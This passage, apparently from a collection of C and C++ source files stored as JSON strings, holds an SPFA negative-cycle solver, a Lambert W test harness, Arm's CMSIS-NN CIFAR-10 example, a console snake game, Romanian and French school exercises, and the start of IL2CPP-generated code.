//\u5982\u679c\u5b58\u5728\u5230v1\u7684\u66f4\u77ed\u8def\uff0c\u90a3\u5c31\u8bb0\u5f55\u66f4\u77ed\u8def\u7684\u8ddd\u79bb\u4e0e\u8fb9\u6570\n            if(dist[v1]>dist[t]+w1)\n            {\n                dist[v1]=dist[t]+w1;\n                cnt[v1]=cnt[t]+1;\n                if(cnt[v1]>=n)\n                    return true;\n                //\u4fdd\u8bc1\u961f\u5217\u4e2d\u6ca1\u6709\u91cd\u590d\u7684\u70b9\uff0c\u8fd9\u91cc\u4e0edijkstra\u4e0d\u540c\n                if(!inq[v1])\n                {\n                    inq[v1]=true;\n                    q.push(v1);//\u521a\u88ab\u677e\u5f1b\uff0c\u5165\u961f\n                }\n            }\n        }\n    }\n    return false;\n}\nvoid solve()\n{\n    if(SPFA(1))\n        puts(\"YES\");\n    else\n        puts(\"NO\");\n}\nint main()\n{\n    int T;\n    scanf(\"%d\",&T);\n    while(T--)\n    {\n        init();\n        solve();\n    }\n    return 0;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <vector>\n#include <random>\n\n#define TIMER_NPRINT\n#include \"Timer.h\"\n\n#include \"ReferenceW.h\"\n#include \"ReferenceW2.h\"\n\nvoid SpeedTest(size_t arrSize)\n{\n\t// Prepare test data\n\tstd::vector<double> data;\n\tstatic std::mt19937_64 gen{ std::random_device{}() };\n\tstd::uniform_real_distribution<double> dist{ 10, 100 };\n\tfor (size_t i = 0; i < arrSize; i++)\n\t\tdata.push_back(dist(gen));\n\n\t// Without repeated inits\n\tReferenceW2 evaluator;\n\n\tTIMER(currentVersion);\n\tdouble _ = 0;\n\tfor (double d : data)\n\t\t_ += evaluator.W0(d).inf;\n\tSTOP_LOG(currentVersion);\n\n\t// Make sure evaluations are not optimized away\n\tstd::cout << std::setprecision(20);\n\tstd::cout << _ << '\\n';\n}\n\nReferenceW::Sign GetPointSign(double x, double w)\n{\n\tstatic ReferenceW evaluator;\n\n\t// Convert w to MPFR\n\tmpfr_t wMpfr;\n\tmpfr_init2(wMpfr, 53);\n\tmpfr_set_d(wMpfr, w, MPFR_RNDN);\n\n\t// Get sign\n\tReferenceW::Sign sign = evaluator.GetMidpointSign(x, wMpfr, false);\n\tif (sign == ReferenceW::Sign::Inconclusive)\n\t\tsign = evaluator.GetMidpointSign(x, wMpfr, true);\n\n\t// Clear MPFR variable\n\tmpfr_clear(wMpfr);\n\n\tif (sign == ReferenceW::Sign::Inconclusive)\n\t\tthrow;\n\n\treturn sign;\n}\n\nvoid Test()\n{\n\tstatic std::mt19937_64 gen{ std::random_device{}() };\n\tstd::uniform_real_distribution<double> dist{ 10, 100 };\n\n\tReferenceW2 evaluator;\n\tfor (;;)\n\t{\n\t\tdouble x = dist(gen);\n\t\tauto [inf, sup] = evaluator.W0(x);\n\n\t\tif (sup != inf && sup != std::nextafter(inf, INFINITY))\n\t\t\tstd::cerr << std::format(\"Bracket too wide! x: {}\\n\", x);\n\n\t\tauto infSign = GetPointSign(x, inf);\n\t\tauto supSign = GetPointSign(x, sup);\n\t\tif (infSign == supSign)\n\t\t\tstd::cerr << std::format(\"Error! x: {}\\n\", x);\n\t}\n}\n\nvoid Profiling(size_t arrSize, size_t numIter)\n{\n\t// Prepare test data\n\tstd::vector<double> data;\n\tstatic std::mt19937_64 gen{ std::random_device{}() };\n\tstd::uniform_real_distribution<double> dist{ 10, 100 };\n\tfor (size_t i = 0; i < arrSize; i++)\n\t\tdata.push_back(dist(gen));\n\n\tReferenceW2 evaluator;\n\n\tdouble _ = 0.0;\n\tfor (size_t i = 0; i < numIter; i++)\n\t\tfor (double d : data)\n\t\t\t_ += evaluator.W0(d).inf;\n\n\tstd::cout << _;\n}\n\nint main()\n{\n#if 0\n\tstd::vector<double> xs;\n\tfor (double x = -0.29; x < 7.34; x += 0.011)\n\t\txs.push_back(x);\n\n\tstd::vector<double> ys = xs;\n\tReferenceW evaluator;\n\tstd::transform(ys.begin(), ys.end(), ys.begin(), [&](double x) { return evaluator.W0(x).inf; });\n\n\tfor (double x : xs)\n\t\tstd::cout << std::format(\"{}\\n\", x);\n\n\tstd::cout << \"\\n\\n\\n\\n\\n\";\n\n\tfor (double y : ys)\n\t\tstd::cout << std::format(\"{}\\n\", y);\n#endif\n\n\tTest();\n\tSpeedTest(100'000);\n}",
    "/* ----------------------------------------------------------------------\n* Copyright (C) 2010-2018 Arm Limited. All rights reserved.\n*\n*\n* Project:       CMSIS NN Library\n* Title:         arm_nnexamples_cifar10.cpp\n*\n* Description:   Convolutional Neural Network Example\n*\n* Target Processor: Cortex-M4/Cortex-M7\n*\n* Redistribution and use in source and binary forms, with or without\n* modification, are permitted provided that the following conditions\n* are met:\n*   - Redistributions of source code must retain the above copyright\n*     notice, this list of conditions and the following disclaimer.\n*   - Redistributions in binary form must reproduce the above copyright\n*     notice, this list of conditions and the following disclaimer in\n*     the documentation and/or other materials provided with the\n*     distribution.\n*   - Neither the name of Arm LIMITED nor the names of its contributors\n*     may be used to endorse or promote products derived from this\n*     software without specific prior written permission.\n*\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n* \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n* LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n* FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n* COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n* INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n* BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n* LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n* ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n* POSSIBILITY OF SUCH DAMAGE.\n* -------------------------------------------------------------------- */\n\n/**\n * @ingroup groupExamples\n */\n\n/**\n * @defgroup CNNExample Convolutional Neural Network Example\n *\n * \\par Description:\n * \\par\n * Demonstrates a convolutional neural network (CNN) example with the use of convolution,\n * ReLU activation, pooling and fully-connected functions.\n *\n * \\par Model definition:\n * \\par\n * The CNN used in this example is based on CIFAR-10 example from Caffe [1]. \n * The neural network consists\n * of 3 convolution layers interspersed by ReLU activation and max pooling layers, followed by a \n * fully-connected layer at the end. The input to the network is a 32x32 pixel color image, which will \n * be classified into one of the 10 output classes. \n * This example model implementation needs 32.3 KB to store weights, 40 KB for activations and \n * 3.1 KB for storing the \\c im2col data.\n *\n * \\image html CIFAR10_CNN.gif \"Neural Network model definition\"\n *\n * \\par Variables Description:\n * \\par\n * \\li \\c conv1_wt, \\c conv2_wt, \\c conv3_wt are convolution layer weight matrices\n * \\li \\c conv1_bias, \\c conv2_bias, \\c conv3_bias are convolution layer bias arrays\n * \\li \\c ip1_wt, ip1_bias point to fully-connected layer weights and biases\n * \\li \\c input_data points to the input image data\n * \\li \\c output_data points to the classification output\n * \\li \\c col_buffer is a buffer to store the \\c im2col output\n * \\li \\c scratch_buffer is used to store the activation data (intermediate layer outputs)\n *\n * \\par CMSIS DSP Software Library Functions Used:\n * \\par\n * - arm_convolve_HWC_q7_RGB()\n * - arm_convolve_HWC_q7_fast()\n * - arm_relu_q7()\n * - arm_maxpool_q7_HWC()\n * - arm_avepool_q7_HWC()\n * - arm_fully_connected_q7_opt()\n * - arm_fully_connected_q7()\n *\n * <b> Refer  </b>\n * \\link arm_nnexamples_cifar10.cpp \\endlink\n *\n * \\par [1] https://github.com/BVLC/caffe\n */\n\n#include <stdint.h>\n#include <stdio.h>\n#include \"arm_math.h\"\n#include \"arm_nnexamples_cifar10_parameter.h\"\n#include \"arm_nnexamples_cifar10_weights.h\"\n\n#include \"arm_nnfunctions.h\"\n#include \"arm_nnexamples_cifar10_inputs.h\"\n\n#ifdef _RTE_\n#include \"RTE_Components.h\"\n#ifdef RTE_Compiler_EventRecorder\n#include \"EventRecorder.h\"\n#endif\n#endif\n\n// include the input and weights\n\nstatic q7_t conv1_wt[CONV1_IM_CH * CONV1_KER_DIM * CONV1_KER_DIM * CONV1_OUT_CH] = CONV1_WT;\nstatic q7_t conv1_bias[CONV1_OUT_CH] = CONV1_BIAS;\n\nstatic q7_t conv2_wt[CONV2_IM_CH * CONV2_KER_DIM * CONV2_KER_DIM * CONV2_OUT_CH] = CONV2_WT;\nstatic q7_t conv2_bias[CONV2_OUT_CH] = CONV2_BIAS;\n\nstatic q7_t conv3_wt[CONV3_IM_CH * CONV3_KER_DIM * CONV3_KER_DIM * CONV3_OUT_CH] = CONV3_WT;\nstatic q7_t conv3_bias[CONV3_OUT_CH] = CONV3_BIAS;\n\nstatic q7_t ip1_wt[IP1_DIM * IP1_OUT] = IP1_WT;\nstatic q7_t ip1_bias[IP1_OUT] = IP1_BIAS;\n\n/* Here the image_data should be the raw uint8 type RGB image in [RGB, RGB, RGB ... RGB] format */\nuint8_t   image_data[CONV1_IM_CH * CONV1_IM_DIM * CONV1_IM_DIM] = IMG_DATA;\nq7_t      output_data[IP1_OUT];\n\n//vector buffer: max(im2col buffer,average pool buffer, fully connected buffer)\nq7_t      col_buffer[2 * 5 * 5 * 32 * 2];\n\nq7_t      scratch_buffer[32 * 32 * 10 * 4];\n\nint main()\n{\n  #ifdef RT",
    "// required header file \n#include <conio.h> \n#include <iostream> \n#include <windows.h> \nusing namespace std; \n\n// height and width of the boundary \nconst int width = 80; \nconst int height = 20; \n\n// Snake head coordinates of snake (x-axis, y-axis) \nint x, y; \n// Food coordinates \nint fruitCordX, fruitCordY; \n// variable to store the score of he player \nint playerScore; \n// Array to store the coordinates of snake tail (x-axis, \n// y-axis) \nint snakeTailX[100], snakeTailY[100]; \n// variable to store the length of the sanke's tail \nint snakeTailLen; \n// for storing snake's moving snakesDirection \nenum snakesDirection { STOP = 0, LEFT, RIGHT, UP, DOWN }; \n// snakesDirection variable \nsnakesDirection sDir; \n// boolean variable for checking game is over or not \nbool isGameOver; \n\n// Function to initialize game variables \nvoid GameInit() \n{ \n\tisGameOver = false; \n\tsDir = STOP; \n\tx = width / 2; \n\ty = height / 2; \n\tfruitCordX = rand() % width; \n\tfruitCordY = rand() % height; \n\tplayerScore = 0; \n} \n\n// Function for creating the game board & rendering \nvoid GameRender(string playerName) \n{ \n\tsystem(\"cls\"); // Clear the console \n\n\t// Creating top walls with '-' \n\tfor (int i = 0; i < width + 2; i++) \n\t\tcout << \"-\"; \n\tcout << endl; \n\n\tfor (int i = 0; i < height; i++) { \n\t\tfor (int j = 0; j <= width; j++) { \n\t\t\t// Creating side walls with '|' \n\t\t\tif (j == 0 || j == width) \n\t\t\t\tcout << \"|\"; \n\t\t\t// Creating snake's head with 'O' \n\t\t\tif (i == y && j == x) \n\t\t\t\tcout << \"O\"; \n\t\t\t// Creating the sanke's food with '#' \n\t\t\telse if (i == fruitCordY && j == fruitCordX) \n\t\t\t\tcout << \"#\"; \n\t\t\t// Creating snake's head with 'O' \n\t\t\telse { \n\t\t\t\tbool prTail = false; \n\t\t\t\tfor (int k = 0; k < snakeTailLen; k++) { \n\t\t\t\t\tif (snakeTailX[k] == j \n\t\t\t\t\t\t&& snakeTailY[k] == i) { \n\t\t\t\t\t\tcout << \"o\"; \n\t\t\t\t\t\tprTail = true; \n\t\t\t\t\t} \n\t\t\t\t} \n\t\t\t\tif (!prTail) \n\t\t\t\t\tcout << \" \"; \n\t\t\t} \n\t\t} \n\t\tcout << endl; \n\t} \n\n\t// Creating bottom walls with '-' \n\tfor (int i = 0; i < width + 2; i++) \n\t\tcout << \"-\"; \n\tcout << endl; \n\n\t// Display player's score \n\tcout << playerName << \"'s Score: \" << playerScore \n\t\t<< endl; \n} \n\n// Function for updating the game state \nvoid UpdateGame() \n{ \n\tint prevX = snakeTailX[0]; \n\tint prevY = snakeTailY[0]; \n\tint prev2X, prev2Y; \n\tsnakeTailX[0] = x; \n\tsnakeTailY[0] = y; \n\n\tfor (int i = 1; i < snakeTailLen; i++) { \n\t\tprev2X = snakeTailX[i]; \n\t\tprev2Y = snakeTailY[i]; \n\t\tsnakeTailX[i] = prevX; \n\t\tsnakeTailY[i] = prevY; \n\t\tprevX = prev2X; \n\t\tprevY = prev2Y; \n\t} \n\n\tswitch (sDir) { \n\tcase LEFT: \n\t\tx--; \n\t\tbreak; \n\tcase RIGHT: \n\t\tx++; \n\t\tbreak; \n\tcase UP: \n\t\ty--; \n\t\tbreak; \n\tcase DOWN: \n\t\ty++; \n\t\tbreak; \n\t} \n\n\t// Checks for snake's collision with the wall (|) \n\tif (x >= width || x < 0 || y >= height || y < 0) \n\t\tisGameOver = true; \n\n\t// Checks for collision with the tail (o) \n\tfor (int i = 0; i < snakeTailLen; i++) { \n\t\tif (snakeTailX[i] == x && snakeTailY[i] == y) \n\t\t\tisGameOver = true; \n\t} \n\n\t// Checks for snake's collision with the food (#) \n\tif (x == fruitCordX && y == fruitCordY) { \n\t\tplayerScore += 10; \n\t\tfruitCordX = rand() % width; \n\t\tfruitCordY = rand() % height; \n\t\tsnakeTailLen++; \n\t} \n} \n\n// Function to set the game difficulty level \nint SetDifficulty() \n{ \n\tint dfc, choice; \n\tcout << \"\\nSET DIFFICULTY\\n1: Easy\\n2: Medium\\n3: hard \"\n\t\t\t\"\\nNOTE: if not chosen or pressed any other \"\n\t\t\t\"key, the difficulty will be automatically set \"\n\t\t\t\"to medium\\nChoose difficulty level: \"; \n\tcin >> choice; \n\tswitch (choice) { \n\tcase '1': \n\t\tdfc = 50; \n\t\tbreak; \n\tcase '2': \n\t\tdfc = 100; \n\t\tbreak; \n\tcase '3': \n\t\tdfc = 150; \n\t\tbreak; \n\tdefault: \n\t\tdfc = 100; \n\t} \n\treturn dfc; \n} \n\n// Function to handle user UserInput \nvoid UserInput() \n{ \n\t// Checks if a key is pressed or not \n\tif (_kbhit()) { \n\t\t// Getting the pressed key \n\t\tswitch (_getch()) { \n\t\tcase 'a': \n\t\t\tsDir = LEFT; \n\t\t\tbreak; \n\t\tcase 'd': \n\t\t\tsDir = RIGHT; \n\t\t\tbreak; \n\t\tcase 'w': \n\t\t\tsDir = UP; \n\t\t\tbreak; \n\t\tcase 's': \n\t\t\tsDir = DOWN; \n\t\t\tbreak; \n\t\tcase 'x': \n\t\t\tisGameOver = true; \n\t\t\tbreak; \n\t\t} \n\t} \n} \n\n// Main function / game looping function \nint main() \n{ \n\tstring playerName; \n\tcout << \"enter your name: \"; \n\tcin >> playerName; \n\tint dfc = SetDifficulty(); \n\n\tGameInit(); \n\twhile (!isGameOver) { \n\t\tGameRender(playerName); \n\t\tUserInput(); \n\t\tUpdateGame(); \n\t\t// creating a delay for according to the chosen \n\t\t// difficulty \n\t\tSleep(dfc); \n\t} \n\n\treturn 0; \n}\n",
    "\ufeff/*\n\n\t#include - folosim o librarie a limbajului de programare\n\n\t--------------------------------------------------------------------------------------------------------------------------\n\t- using namespace std; // ( este necesar pentru a nu mai scrie std:: inaintea unei functii dar are si altfel de avantaje )\n\t--------------------------------------------------------------------------------------------------------------------------\n\n\n\n*/\n#include <iostream>\n#include <cmath>\n#include <numeric>\n#include <stdio.h>\n#include <string>\n\nusing namespace std;\n\n# define M_PI           3.14159265358979323846  /* pi */\n\n#define NRPROB problemaf3x38\n\nstatic bool estePar(int n)\n{\n\tif (n % 2 == 0)\n\t{\n\t\tcout << \"true\";\n\t\treturn true;\n\t}\n\t\t\n\telse {\n\t\tcout << \"false\";\n\t\treturn false;\n\t}\n\n\treturn false;\n}\n\nint gcd(int a, int b) {\n\t// Find Minimum of a and b\n\tint res = min(a, b);\n\n\t// Testing divisiblity with all numbers starting from\n  // min(a, b) to 1\n\n\twhile (res > 1) {\n\n\t\t// If any number divide both a and b, so we\n\t\t// got the answer\n\t\tif (a % res == 0 && b % res == 0)\n\t\t\tbreak;\n\t\tres--;\n\t}\n\treturn res;\n}\n\nvoid reduceFraction(int& num, int& den) {\n\tint gcdValue = gcd(num, den);\n\tnum /= gcdValue;\n\tden /= gcdValue;\n}\n/*\n--------------------------------------------------------------------------------------------\n\t\t\n\t\tFISA 3\n\n--------------------------------------------------------------------------------------------\n\n*/\nstatic int problemaf3x38()\n{\n\tdouble a, b;\n\tcin >> a >> b;\n\tdouble s = pow(a, b);\n\tcout << s;\n\treturn false;\n}\n\nstatic int problemaf3x35()\n{\n\tint n, x;\n\tcin >> n;\n\n\t// Extragem cifrele\n\tint zeci = n / 10;\n\tint unitati = n % 10;\n\n\t// Dubl\u0103m fiecare cifr\u0103\n\tint dubluZeci = zeci * 2;\n\tint dubluUnitati = unitati * 2;\n\n\t// Construim num\u0103rul rezultat\n\tx = dubluZeci * 100 + dubluUnitati;  // form\u0103m num\u0103rul nou\n\n\t// Afi\u0219\u0103m rezultatul\n\tcout << x << endl;\n\n\treturn 0;\n}\n\nstatic int problemaf3x34()\n{\n\tint a, b, c;\n\tcin >> a >> b >> c;\n\n\t// Calcul\u0103m sumele dintre fiecare dou\u0103 numere distincte\n\tint suma1 = a + b;\n\tint suma2 = a + c;\n\tint suma3 = b + c;\n\n\t// Afi\u0219\u0103m rezultatele\n\tcout << \"Suma dintre \" << a << \" si \" << b << \" este: \" << suma1 << endl;\n\tcout << \"Suma dintre \" << a << \" si \" << c << \" este: \" << suma2 << endl;\n\tcout << \"Suma dintre \" << b << \" si \" << c << \" este: \" << suma3 << endl;\n\n\treturn 0;\n}\n\nstatic int problemaf3x31()\n{\n\tint n;\n\tcout << \"Enter a 4-digit number: \";\n\tcin >> n;\n\n\t// Convert the number to a string\n\tstring nStr = to_string(n);\n\tstring result = \"\";\n\n\t// Insert '0' after each digit\n\tfor (char digit : nStr) {\n\t\tresult += digit;\n\t\tresult += '0';  // Append '0' after each digit\n\t}\n\n\t// Output the result\n\tcout << \"The new number is: \" << result << endl;\n\n\treturn 0;\n}\n\nstatic int problemaf3x29()\n{\n\tint a, b, c, d;\n\n\t// Input the two fractions\n\tcout << \"Enter numerator and denominator of the first fraction: \";\n\tcin >> a >> b;\n\tcout << \"Enter numerator and denominator of the second fraction: \";\n\tcin >> c >> d;\n\n\t// Calculate the sum\n\tint sumNum = a * d + c * b;\n\tint sumDen = b * d;\n\treduceFraction(sumNum, sumDen);  // Simplify the fraction\n\n\t// Calculate the product\n\tint prodNum = a * c;\n\tint prodDen = b * d;\n\treduceFraction(prodNum, prodDen);  // Simplify the fraction\n\n\t// Output the results\n\tcout << sumNum << \"/\" << sumDen << \" \" << prodNum << \"/\" << prodDen << endl;\n\n\treturn 0;\n}\n\n//  sa se det val a si b si sa se afiseze cel mai mic, respectiv cel mai mare numar format din toate cifrele prime distrincte \n\nstatic int problemaf3x28()\n{\n\tint a = 2357;  \n\tint b = 7532;\n\n\tcout << a << \" \" << b << endl;\n\treturn false;\n}\n\n// n 4 cifre ultima cifra a sumei obtinute din nr de 3 cifre formate din n prin eliminarea unei singure cifre\n\nstatic int problemaf3x27()\n{\n\tint n;\n\tcout << \"Introdu un numar de patru cifre: \";\n\tcin >> n;\n\n\t// Extrage fiecare cifr\u0103 a num\u0103rului de patru cifre\n\tint a = n / 1000;         // prima cifr\u0103\n\tint b = (n / 100) % 10;   // a doua cifr\u0103\n\tint c = (n / 10) % 10;    // a treia cifr\u0103\n\tint d = n % 10;           // a patra cifr\u0103\n\n\t// Formeaz\u0103 cele trei numere de trei cifre prin eliminarea unei cifre\n\tint num1 = b * 100 + c * 10 + d; // elimin\u0103m prima cifr\u0103\n\tint num2 = a * 100 + c * 10 + d; // elimin\u0103m a doua cifr\u0103\n\tint num3 = a * 100 + b * 10 + d; // elimin\u0103m a treia cifr\u0103\n\tint num4 = a * 100 + b * 10 + c; // elimin\u0103m a patra cifr\u0103\n\n\t// Calculeaz\u0103 suma celor trei numere ob\u021binute\n\tint suma = num1 + num2 + num3 + num4;\n\n\t// Ob\u021bine ultima cifr\u0103 a sumei\n\tint ultimaCifra = suma % 10;\n\n\t// Afi\u0219eaz\u0103 rezultatul\n\tcout << \"Ultima cifra a sumei este: \" << ultimaCifra << endl;\n\n\treturn 0;\n}\n\n// nr n de 4 cifre , oglinditul nr\nstatic int problemaf3x25()\n{\n\tint n;\n\tcin >> n;\n\tint x = n / 1000;\n\tint y = n % 1000 / 100;\n\tint z = n % 100 / 10;\n\tint v = n % 10;\n\n\tcout << v << z << y << x;\n\treturn false;\n}\n\n// n 5 cifre , mA a cifrelor sale\n\nstatic int problemaf3x24()\n{\n\tint n;\n\tcout << \"Introdu un numar de 5 cifre pentru a calcula media aritmetica a cifrelor: \";\n\tcin >> n;\n\tint x = n / 10000;\n\tint y = n ",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n\r\n\r\nfloat Calcul_Moyenne(float somme, int nombre) {\r\n    return somme / nombre;\r\n}\r\n\r\nvoid tri(float tab[], char noms[][10], int size) {\r\n    for (int i = 0; i < size - 1; i++) {\r\n        for (int j = 0; j < size - i - 1; j++) {\r\n            if (tab[j] > tab[j + 1]) {\r\n                float temp = tab[j];\r\n                tab[j] = tab[j + 1];\r\n                tab[j + 1] = temp;\r\n\r\n                for (int k = 0; k < 10; k++) {\r\n                    char tempChar = noms[j][k];\r\n                    noms[j][k] = noms[j + 1][k];\r\n                    noms[j + 1][k] = tempChar;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nint main() {\r\n    int size;\r\n    float somme = 0;\r\n    char noms[30][10];\r\n    char choice;\r\n\r\n    do{\r\n\r\n        printf(\"========================================\\n\");\r\n        printf(\"          Pronote version wish          \\n\");\r\n        printf(\"========================================\\n\\n\");\r\n\r\n        // R\u00e9cup\u00e8re le nombre d'\u00e9l\u00e8ves\r\n\r\n        do\r\n        {\r\n            printf(\"Nombre d'eleves (Min : 2 ; Max : 30) : \");\r\n            scanf_s(\"%d\", &size);\r\n            if (size <= 0 || size > 30) {\r\n                printf(\"Taille invalide, veuillez entrer un nombre entre 2 et 30.\\n\");\r\n            }\r\n\r\n        } while (size < 1);\r\n\r\n\r\n\r\n        float* tab = (float*)malloc(size * sizeof(float));\r\n\r\n        if (tab == NULL) {\r\n            printf(\"Erreur d'allocation m\u00e9moire !\\n\");\r\n            return 1;\r\n        }\r\n\r\n        // R\u00e9cup\u00e8re les noms\r\n\r\n        for (int i = 0; i < size; i++) {\r\n            printf(\"#%d Nom : \", i + 1);\r\n            scanf_s(\"%9s\", noms[i], (unsigned)_countof(noms[i]));\r\n        }\r\n\r\n        // R\u00e9cup\u00e8re les notes\r\n\r\n        for (int i = 0; i < size; i++) {\r\n            printf(\"#%d %s : \", i + 1, noms[i]);\r\n            scanf_s(\"%f\", &tab[i]);\r\n            while (tab[i] < 0.0f) {\r\n                printf(\"Erreur, la note ne peut se etre en dessou de 0\\n\");\r\n                printf(\"#%d %s : \", i + 1, noms[i]);\r\n                scanf_s(\"%f\", &tab[i]);\r\n            }\r\n            somme += tab[i];\r\n        }\r\n\r\n        printf(\"\\n========================================\\n\");\r\n        printf(\"                Resultats                 \\n\");\r\n        printf(\"========================================\\n\\n\");\r\n\r\n        printf(\"-----------------------\\n\");\r\n        printf(\"| %-10s | %6s |\\n\", \"Nom\", \"Note\");\r\n        printf(\"|------------|--------|\\n\");\r\n\r\n        // Affiche les noms\r\n\r\n        for (int i = 0; i < size; i++) {\r\n            printf(\"| %-10s | %6.2f |\\n\", noms[i], tab[i]);\r\n            printf(\"|------------|--------|\\n\");\r\n        }\r\n        printf(\"\\nMoyenne de la classe : %.2f\\n\", Calcul_Moyenne(somme, size));\r\n\r\n        printf(\"\\n----------------------------------------\\n\");\r\n\r\n        printf(\"\\nNotes dans l'ordre croissant :\\n\\n\");\r\n\r\n        tri(tab, noms, size);\r\n\r\n        printf(\"-----------------------\\n\");\r\n        printf(\"| %-10s | %6s |\\n\", \"Nom\", \"Note\");\r\n        printf(\"|------------|--------|\\n\");\r\n\r\n        // Affiche les notes avec les noms\r\n\r\n        for (int i = 0; i < size; i++) {\r\n            printf(\"| %-10s | %6.2f |\\n\", noms[i], tab[i]);\r\n            printf(\"-----------------------\\n\");\r\n        }\r\n\r\n        printf(\"\\n----------------------------------------\\n\");\r\n\r\n        // Affiche les notes dans l'ordre croissant\r\n\r\n        if (size > 0) {\r\n            printf(\"\\nNote la plus basse : \\n\");\r\n            printf(\"\\n-----------------------\\n\");\r\n            printf(\"| %-10s | %6.2f |\\n\", noms[0], tab[0]);\r\n            printf(\"-----------------------\\n\");\r\n            printf(\"\\nNote la plus haute : \\n\");\r\n            printf(\"\\n-----------------------\\n\");\r\n            printf(\"| %-10s | %6.2f |\\n\", noms[size - 1], tab[size - 1]);\r\n            printf(\"-----------------------\\n\");\r\n        }\r\n        else {\r\n            printf(\"Aucune note disponible.\\n\");\r\n        }\r\n\r\n        // Lib\u00e8re la m\u00e9moire\r\n\r\n        free(tab);\r\n\r\n        printf(\"\\nAppuyer sur 'c' pour continuer ou 'q' pour quitter : \");\r\n\r\n        while (getchar() != '\\n');\r\n        choice = getchar();\r\n\r\n    } while (choice != 'q');\r\n\r\n    printf_s(\"========================================\\n\");\r\n    printf_s(\"                  Bye                   \\n\");\r\n    printf_s(\"========================================\\n\");\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"pch-cpp.hpp\"\n\n#ifndef _MSC_VER\n# include <alloca.h>\n#else\n# include <malloc.h>\n#endif\n\n\n#include <limits>\n\n\ntemplate <typename R>\nstruct VirtualFuncInvoker0\n{\n\ttypedef R (*Func)(void*, const RuntimeMethod*);\n\n\tstatic inline R Invoke (Il2CppMethodSlot slot, RuntimeObject* obj)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\treturn ((Func)invokeData.methodPtr)(obj, invokeData.method);\n\t}\n};\ntemplate <typename R, typename T1>\nstruct VirtualFuncInvoker1\n{\n\ttypedef R (*Func)(void*, T1, const RuntimeMethod*);\n\n\tstatic inline R Invoke (Il2CppMethodSlot slot, RuntimeObject* obj, T1 p1)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\treturn ((Func)invokeData.methodPtr)(obj, p1, invokeData.method);\n\t}\n};\ntemplate <typename R, typename T1, typename T2, typename T3, typename T4>\nstruct VirtualFuncInvoker4\n{\n\ttypedef R (*Func)(void*, T1, T2, T3, T4, const RuntimeMethod*);\n\n\tstatic inline R Invoke (Il2CppMethodSlot slot, RuntimeObject* obj, T1 p1, T2 p2, T3 p3, T4 p4)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\treturn ((Func)invokeData.methodPtr)(obj, p1, p2, p3, p4, invokeData.method);\n\t}\n};\ntemplate <typename R, typename T1, typename T2, typename T3, typename T4, typename T5>\nstruct VirtualFuncInvoker5\n{\n\ttypedef R (*Func)(void*, T1, T2, T3, T4, T5, const RuntimeMethod*);\n\n\tstatic inline R Invoke (Il2CppMethodSlot slot, RuntimeObject* obj, T1 p1, T2 p2, T3 p3, T4 p4, T5 p5)\n\t{\n\t\tconst VirtualInvokeData& invokeData = il2cpp_codegen_get_virtual_invoke_data(slot, obj);\n\t\treturn ((Func)invokeData.methodPtr)(obj, p1, p2, p3, p4, p5, invokeData.method);\n\t}\n};\n\nstruct ConcurrentDictionary_2_tF598E45B2A3ECB23FD311D829FB0AB32B1201ACF;\nstruct ConcurrentDictionary_2_tE0296B741D9F887264D805ED46C4249B8F5EFC9C;\nstruct Dictionary_2_t9FA6D82CAFC18769F7515BB51D1C56DAE09381C3;\nstruct Dictionary_2_t87EDE08B2E48F793A22DE50D6B3CC2E7EBB2DB54;\nstruct Dictionary_2_t14FE4A752A83D53771C584E4C8D14E01F2AFD7BA;\nstruct Dictionary_2_tE1603CE612C16451D1E56FF4D4859D4FE4087C28;\nstruct Dictionary_2_t5C8F46F5D57502270DD9E1DA8303B23C7FE85588;\nstruct Dictionary_2_t46B2DB028096FA2B828359E52F37F3105A83AD83;\nstruct Dictionary_2_t42B08F27E32EDAA06A656F208F4F64F212F66238;\nstruct Func_2_tF42287527472FA89789873F068A87C60A00EC7D3;\nstruct Func_2_t0FD9221539E762B3867B2E3B6D6B3F90C6483088;\nstruct IEnumerable_1_t60509816D8966320E2A9660FC756B6C440ADFC50;\nstruct IEnumerable_1_t3C6913E067AB1171D9894C79A396D8A8E90E311B;\nstruct IEqualityComparer_1_t2CA7720C7ADCCDECD3B02E45878B4478619D5347;\nstruct IEqualityComparer_1_tAE94C8F24AD5B94D4EE85CA9FC59E3409D41CAF7;\nstruct KeyCollection_t2EDD317F5771E575ACB63527B5AFB71291040342;\nstruct Tables_t411BA506B39C4694DD5A87F1D6776FF28F32E77C;\nstruct ValueCollection_t238D0D2427C6B841A01F522A41540165A2C4AE76;\nstruct EntryU5BU5D_t1AF33AD0B7330843448956EC4277517081658AE7;\nstruct KeyValuePair_2U5BU5D_tEA2EBC56D51C33037B041DD38F518261CEE2C84C;\nstruct ByteU5BU5D_tA6237BF417AE52AD70CFB4EF24A7A82613DF9031;\nstruct CharU5BU5D_t799905CF001DD5F13F7DBB310181FC4D8B7D0AAB;\nstruct DelegateU5BU5D_tC5AB7E8F745616680F337909D3A8E6C722CDF771;\nstruct Int32U5BU5D_t19C97395396A72ECAF310612F0760F165060314C;\nstruct 